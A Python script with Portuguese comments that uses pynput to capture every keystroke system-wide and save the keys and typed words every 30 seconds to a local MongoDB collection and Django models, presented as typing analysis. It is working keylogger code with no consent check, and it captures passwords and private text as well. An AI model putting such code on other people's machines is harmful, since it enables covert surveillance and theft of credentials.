import atexit
import pymongo
from pynput import keyboard
import time
import datetime
import re

from tools.models.models import Day, KeywordsData  # Importe os modelos do seu aplicativo Django

# Conectar ao banco de dados MongoDB
try:
    client = pymongo.MongoClient("mongodb://localhost:27017")
    db = client["mydatabase"]
    collection = db.get_collection("keywords_data")
    if collection is None:
        collection = db.create_collection("keywords_data")
except pymongo.errors.ConnectionError as e:
    print("Erro ao conectar ao MongoDB:", e)
    # Lógica para lidar com o erro de conexão, se necessário

def analyze_typing(text):
    pattern = r"\b\w{2,}\b"
    created_words = re.findall(pattern, text)
    return created_words

# Variáveis para o nome do arquivo e a tag do dia
name_list = []
words_list = []

def save_keyboards(keys):
    # Transformar a lista de teclas em uma string
    keys_str = ' '.join(keys)

    # Obter a data e hora atual
    current_time = datetime.datetime.now()

    # Obter o nome do arquivo
    global name_list
    if not name_list:
        name = current_time.strftime("%Y%m%d_%H%M%S")
        name_list.append(name)
    else:
        name = name_list[0]

    # Obter todas as palavras digitadas
    global words_list
    words_str = ' '.join(words_list)

    # Salvar os dados na classe KeywordsData
    day = Day.objects.create(date=current_time.date())
    keywords_data = KeywordsData.objects.create(
        day=day,
        filename=name,
        timestamp=current_time,
        keys_list=keys,
        keys_str=keys_str,
        words=len(words_list)
    )

    # Inserir o documento no banco de dados
    data = {
        'day': day.id,
        'filename': keywords_data.filename,
        'timestamp': keywords_data.timestamp,
        'keys_list': keywords_data.keys_list,
        'keys_str': keywords_data.keys_str,
        'words': keywords_data.words
    }
    collection.insert_one(data)

def on_press(key):
    global keys
    if key == keyboard.Key.space:
        print(key)
        keys.append(" ")  # Adicionar espaço à lista de teclas
        words_list.append(" ")  # Adicionar espaço à lista de palavras
    elif hasattr(key, 'char'):
        print(key)
        keys.append(key.char)
        words_list.append(key.char)
    else:
        print(key)
        keys.append(str(key))
        words_list.append(str(key))

keys = []  # Lista para armazenar as teclas digitadas

# Configurar o intervalo de tempo para capturar as teclas
interval = 30  # Capturar as teclas a cada 30 segundos

# Iniciar a captura de eventos de teclado
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Definir uma função de saída para lidar com o desligamento do sistema
def exit_handler():
    # Verificar se existem teclas capturadas
    if keys:
        # Salvar as teclas no banco de dados
        save_keyboards(keys)

    # Parar a captura de eventos de teclado
    keyboard_listener.stop()


# Registrar a função de saída para ser chamada no desligamento do sistema
atexit.register(exit_handler)


# Loop principal
try:
    while True:
        # Aguardar o intervalo de tempo
        time.sleep(interval)

        # Verificar se existem teclas capturadas
        if keys:
            # Salvar as teclas no banco de dados
            save_keyboards(keys)

            # Limpar a lista de teclas
            keys = []

except KeyboardInterrupt:
    # Ignorar a exceção KeyboardInterrupt e continuar o programa
    pass
